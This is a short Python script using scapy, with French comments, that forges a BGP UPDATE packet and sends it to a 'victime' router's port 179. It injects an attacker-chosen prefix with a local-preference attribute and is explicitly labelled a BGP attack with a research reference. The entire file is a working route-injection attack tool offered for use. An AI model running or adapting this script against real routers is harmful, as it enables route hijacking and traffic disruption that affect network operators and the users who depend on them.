
#!/usr/bin/env python3
import sys
import os
import time
import argparse
import socket
from scapy.layers.inet import IP, TCP
from scapy.contrib.bgp import BGPHeader, BGPUpdate, BGPPathAttr, BGPNLRI_IPv4, BGPPALocalPref
import scapy.sendrecv

# BGP attack :https://apps.dtic.mil/sti/trecms/pdf/AD1045809.pdf

# explication : https://kadiska.com/fr/comment-fonctionne-le-routage-bgp/

parser = argparse.ArgumentParser()
parser.add_argument('-I', '--INTERFACE', help="renseigner l'interface utilisee : eth0, wlan0, ...")
parser.add_argument('-v', '--IP_VICTIME', help="renseigner l'adresse ip de la victime")
parser.add_argument('-p', '--NLRI_PREFIX', help="NLRI sous la forme: 134.193.0.0/16")
args = parser.parse_args()


interface = args.INTERFACE
ip_victime = args.IP_VICTIME
nlri_prefix = args.NLRI_PREFIX

def main():

	established_port = 1223
	expected_seq_num=1000
	current_seq_num=1500

	base = IP(dst=ip_victime, proto=6, ttl=255) # proto=6 represents that, TCP will be travelling above this layer. This is simple IPV4 communication.

	tcp = TCP(sport=established_port, dport=179, seq=current_seq_num, ack=expected_seq_num, flags='PA') # dport=179 means, we are communicating with bgp port of the destination router/ host. sport is a random port over which tcp is established. seq and ack are the sequence number and acknowledgement numbers. flags = PA are the PUSH and ACK flags.
	hdr = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff) # type=2 means UPDATE packet will be the BGP Payload, marker field is for authentication. max hex int (all f) are used for no auth.

	up = BGPUpdate(path_attr=[BGPPathAttr(type_flags=64, type_code=5, attribute=BGPPALocalPref(local_pref=100))], nlri=BGPNLRI_IPv4(prefix=nlri_prefix)) # update packet consist of path attributes and NLRI (Network layer reachability information),  type_code in path attributes is for which type of path attribute it is.

	packet = base / tcp / hdr / up
	# packet.show2()

	packets = scapy.sendrecv.sr1(packet, verbose=False, timeout=10)
	
	sys.exit(1)

if __name__ == "__main__":
	main()
